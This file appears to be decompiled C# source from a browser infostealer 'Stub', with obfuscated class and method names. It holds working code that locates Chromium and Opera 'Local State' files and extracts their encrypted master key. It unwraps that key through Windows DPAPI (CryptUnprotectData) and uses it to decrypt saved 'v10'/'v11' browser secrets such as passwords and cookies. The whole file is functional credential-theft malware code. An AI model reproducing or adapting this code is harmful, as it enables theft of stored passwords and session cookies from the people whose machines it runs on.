using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Stub
{
	// Token: 0x02000011 RID: 17
	public sealed class Class2
	{
		// Token: 0x0600002E RID: 46
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CryptUnprotectData(ref Class2.Struct1 struct1_0, ref string String_1, ref Class2.Struct1 struct1_1, IntPtr intptr_0, ref Class2.Struct0 struct0_0, int int_0, ref Class2.Struct1 struct1_2);

		// Token: 0x0600002F RID: 47 RVA: 0x0000343C File Offset: 0x0000163C
		public static byte[] smethod_0(byte[] byte_1, byte[] byte_2 = null)
		{
			Class2.Struct1 @struct = default(Class2.Struct1);
			Class2.Struct1 struct2 = default(Class2.Struct1);
			Class2.Struct1 struct3 = default(Class2.Struct1);
			Class2.Struct0 struct4 = new Class2.Struct0
			{
				int_0 = Marshal.SizeOf(typeof(Class2.Struct0)),
				int_1 = 0,
				intptr_0 = IntPtr.Zero,
				String_0 = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (byte_1 == null)
					{
						byte_1 = new byte[0];
					}
					struct2.intptr_0 = Marshal.AllocHGlobal(byte_1.Length);
					struct2.int_0 = byte_1.Length;
					Marshal.Copy(byte_1, 0, struct2.intptr_0, byte_1.Length);
				}
				catch
				{
				}
				try
				{
					if (byte_2 == null)
					{
						byte_2 = new byte[0];
					}
					struct3.intptr_0 = Marshal.AllocHGlobal(byte_2.Length);
					struct3.int_0 = byte_2.Length;
					Marshal.Copy(byte_2, 0, struct3.intptr_0, byte_2.Length);
				}
				catch
				{
				}
				Class2.CryptUnprotectData(ref struct2, ref empty, ref struct3, IntPtr.Zero, ref struct4, 1, ref @struct);
				byte[] array = new byte[@struct.int_0];
				Marshal.Copy(@struct.intptr_0, array, 0, @struct.int_0);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (@struct.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(@struct.intptr_0);
				}
				if (struct2.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(struct2.intptr_0);
				}
				if (struct3.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(struct3.intptr_0);
				}
			}
			return new byte[0];
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000035F0 File Offset: 0x000017F0
		public static byte[] smethod_1(string String_1)
		{
			string text = (!String_1.Contains("Opera")) ? (String_1 + "\\Local State") : (String_1 + "\\Opera Stable\\Local State");
			byte[] array = new byte[0];
			if (!File.Exists(text))
			{
				return null;
			}
			if (text != Class2.String_0)
			{
				Class2.String_0 = text;
				foreach (object obj in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text)))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
				}
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				try
				{
					Class2.byte_0 = Class2.smethod_0(array2, null);
					return Class2.byte_0;
				}
				catch
				{
					return null;
				}
			}
			return Class2.byte_0;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00003710 File Offset: 0x00001910
		public static string smethod_2(string String_1)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(String_1);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = String_1;
			}
			return result;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00003750 File Offset: 0x00001950
		public static byte[] smethod_3(byte[] byte_1, byte[] byte_2)
		{
			byte[] array = new byte[12];
			Array.Copy(byte_1, 3, array, 0, 12);
			byte[] result;
			try
			{
				byte[] array2 = new byte[byte_1.Length - 15];
				Array.Copy(byte_1, 15, array2, 0, byte_1.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				result = new Class19().method_0(byte_2, array, null, array4, array3);
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = null;
			}
			return result;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000037F0 File Offset: 0x000019F0
		public static string smethod_4(string String_1, string String_2)
		{
			if (!String_2.StartsWith("v10") && !String_2.StartsWith("v11"))
			{
				return Encoding.Default.GetString(Class2.smethod_0(Encoding.Default.GetBytes(String_2), null));
			}
			byte[] byte_ = Class2.smethod_1(Directory.GetParent(String_1).Parent.FullName);
			return Encoding.Default.GetString(Class2.smethod_3(Encoding.Default.GetBytes(String_2), byte_));
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00002105 File Offset: 0x00000305
		public static string smethod_5(string String_1)
		{
			if (String_1.Contains("Opera"))
			{
				return "Opera";
			}
			String_1.Replace(Class25.String_4, "");
			return String_1.Split(new char[]
			{
				'\\'
			})[1];
		}

		// Token: 0x04000008 RID: 8
		public static string String_0 = "";

		// Token: 0x04000009 RID: 9
		public static byte[] byte_0 = new byte[0];

		// Token: 0x02000012 RID: 18
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct Struct0
		{
			// Token: 0x0400000A RID: 10
			public int int_0;

			// Token: 0x0400000B RID: 11
			public int int_1;

			// Token: 0x0400000C RID: 12
			public IntPtr intptr_0;

			// Token: 0x0400000D RID: 13
			public string String_0;
		}

		// Token: 0x02000013 RID: 19
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct Struct1
		{
			// Token: 0x0400000E RID: 14
			public int int_0;

			// Token: 0x0400000F RID: 15
			public IntPtr intptr_0;
		}
	}
}
